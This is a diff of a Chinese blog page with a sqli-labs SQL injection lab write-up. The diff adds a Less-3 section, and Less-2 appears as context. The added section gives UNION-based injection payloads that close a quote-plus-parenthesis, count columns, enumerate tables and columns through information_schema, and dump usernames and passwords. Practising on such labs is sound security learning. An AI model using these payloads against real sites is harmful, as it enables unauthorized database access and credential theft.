@@ -133,7 +133,7 @@
                   
                   <span class="post-meta">
                     <i class="far fa-chart-bar"></i>
-                    182 字
+                    274 字
                   </span>
                 
 
@@ -175,7 +175,7 @@
         <div class="py-5 z-depth-3" id="board">
           <div class="post-content mx-auto" id="post">
             
-              <p class="note note-warning">本文最后更新于：星期五, 五月 22日 2020, 8:26 晚上</p>
+              <p class="note note-warning">本文最后更新于：星期日, 五月 24日 2020, 8:14 晚上</p>
             
             <div class="markdown-body">
               <h2 id="sqli-labs-writeup"><a href="#sqli-labs-writeup" class="headerlink" title="sqli-labs writeup"></a>sqli-labs writeup</h2><p>刷刷sqli-labs ，学习下sql注入漏洞</p>
@@ -198,7 +198,19 @@
 ?id=0 union select 1,2,group_concat(column_name) from  information_schema.columns where table_name=&#39;users&#39;
 获取字段内容
 ?id=0 union select 1,2,group_concat(0x3a,username,0x3a,password) from users 
-</code></pre><h3 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h3>
+</code></pre><h3 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h3><p>单引号加圆括号闭合</p>
+<p>payload：</p>
+<pre><code>注入点探测：
+?id=1&#39;) and 1=2 --+
+获取列数量：
+?id=1&#39;) order by 4 --+
+获取表名：
+?id=0&#39;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
+获取列名：
+?id=0&#39;) union select 1,2,group_concat(column_name) from  information_schema.columns where table_name=&#39;users&#39; --+
+获取数据：
+?id=0&#39;) union select 1,2,group_concat(0x3a,username,0x3a,password) from users --+
+</code></pre><h3 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h3>
             </div>
             <hr>
             <div>
